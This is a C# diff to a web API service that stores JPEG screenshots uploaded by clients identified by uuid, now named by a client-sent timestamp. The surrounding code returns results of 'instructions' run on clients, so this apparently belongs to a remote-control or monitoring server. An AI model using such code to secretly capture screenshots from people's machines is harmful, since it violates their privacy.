@@ -31,28 +31,26 @@ namespace X_ZIGZAG_SERVER_WEB_API.Services
             }
             return await _context.Results.Where(u => u.ClientId.Equals(uuid)).Select(d => new ResultResponseVM { InstructionId = d.InstructionId, Code = d.Code, ResultDate=d.ResultDate,FunctionArgs=d.FunctionArgs,Output=d.Output }).ToListAsync();
         }   
-        public async Task StoreScreenshot(string uuid, int Index, byte[] imageData)
+        public async Task StoreScreenshot(string uuid, int Index,long UnixTimeStamp, byte[] imageData)
         {
             var UserSettings = await _context.CheckSettings.Where(u=> u.Id.Equals(uuid)).FirstOrDefaultAsync();
             if (UserSettings!=null && IsJpeg(imageData))
             {
-                if (UserSettings.Screenshot != 0)
+                try
                 {
-                    try {
-                        string uploadsFolder = Path.Combine(_environment.ContentRootPath, "Screenshots", uuid, Index.ToString());
-                        Directory.CreateDirectory(uploadsFolder);
-                        string filePath = Path.Combine(uploadsFolder, $"{DateTimeOffset.UtcNow.ToUnixTimeSeconds()}.jpg");
-                        await System.IO.File.WriteAllBytesAsync(filePath, imageData);
-                        if (UserSettings.Screenshot == -1)
-                        {
-                            UserSettings.Screenshot = 0;
-                        }
-                        _context.CheckSettings.Update(UserSettings);
-                        await _context.SaveChangesAsync();
-                    }
-                    catch (Exception)
+                    string uploadsFolder = Path.Combine(_environment.ContentRootPath, "Screenshots", uuid, Index.ToString());
+                    Directory.CreateDirectory(uploadsFolder);
+                    string filePath = Path.Combine(uploadsFolder, $"{UnixTimeStamp}.jpg");
+                    await System.IO.File.WriteAllBytesAsync(filePath, imageData);
+                    if (UserSettings.Screenshot == -1)
                     {
+                        UserSettings.Screenshot = 0;
                     }
+                    _context.CheckSettings.Update(UserSettings);
+                    await _context.SaveChangesAsync();
+                }
+                catch (Exception)
+                {
                 }
             }
         }
